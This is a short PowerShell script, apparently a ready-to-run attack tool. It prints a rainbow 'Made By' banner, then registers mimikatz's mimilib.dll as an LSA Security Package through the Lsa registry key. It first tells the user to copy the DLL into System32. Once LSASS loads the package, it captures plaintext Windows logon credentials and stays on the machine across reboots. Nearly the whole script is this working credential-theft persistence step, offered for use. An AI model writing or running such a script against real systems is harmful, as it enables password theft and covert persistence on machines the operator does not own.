# Rainbow colors for text
$colors = "Red", "Yellow", "Green", "Cyan", "Blue", "Magenta"
$text = "Made By @N1NJ10"

# Loop through the text and apply rainbow colors
for ($i = 0; $i -lt $text.Length; $i++) {
    $color = $colors[$i % $colors.Length]
    $char = $text[$i]
    Write-Host -NoNewline -ForegroundColor $color $char
}

# Important Note 
Write-Host "`nYou must before doning this to copy the mimilib.dll from https://github.com/ParrotSec/mimikatz to the C:\Windows\System32\ "

$registryPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$valueName = 'Security Packages'
$newValues = "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" -split '\0'

try {
    # Try to get the "Security Packages" value within the key
    $securityPackages = Get-ItemProperty -Path $registryPath | Select-Object -ExpandProperty $valueName

    if ($securityPackages -eq $null -or $securityPackages -eq '') {
        Write-Host "The 'Security Packages' value in $registryPath is empty or not set. Adding the new values..."
        Set-ItemProperty -Path $registryPath -Name $valueName -Value $newValues -Type MultiString
        Write-Host "The 'Security Packages' value has been updated with the new values."
    } else {
        Write-Host "The 'Security Packages' value in $registryPath is not empty."
        
        # Split the existing value by '\0' and compare it to the new values
        $existingValues = $securityPackages -split '\0'
        $missingValues = $newValues | Where-Object { $_ -notin $existingValues }

        if ($missingValues.Count -gt 0) {
            Write-Host "The following values are missing and have been added:"
            $missingValues | ForEach-Object {
                Write-Host $_
            }

            # Append missing values to the existing value and update the registry
            $updatedValue = $securityPackages + '\0' + ($missingValues -join '\0')
            Set-ItemProperty -Path $registryPath -Name $valueName -Value $updatedValue -Type MultiString
            Write-Host "The 'Security Packages' value has been updated with the missing values."
        } else {
            Write-Host "All the required values are already present in the 'Security Packages' value."
        }
    }

    # Verify if all required values are present in the 'Security Packages' value
    $updatedSecurityPackages = Get-ItemProperty -Path $registryPath | Select-Object -ExpandProperty $valueName
    $missingValues = $newValues | Where-Object { $_ -notin $updatedSecurityPackages }

    if ($missingValues.Count -eq 0) {
        Write-Host "All the required values are present in the 'Security Packages' value."
    } else {
        Write-Host "Some required values are missing in the 'Security Packages' value."
    }

    # Print all values in 'Security Packages' on separate lines
    $updatedSecurityPackages -split '\0' | ForEach-Object {
        Write-Host $_
    }

} catch {
    Write-Host "An error occurred while trying to access the 'Security Packages' value."
}
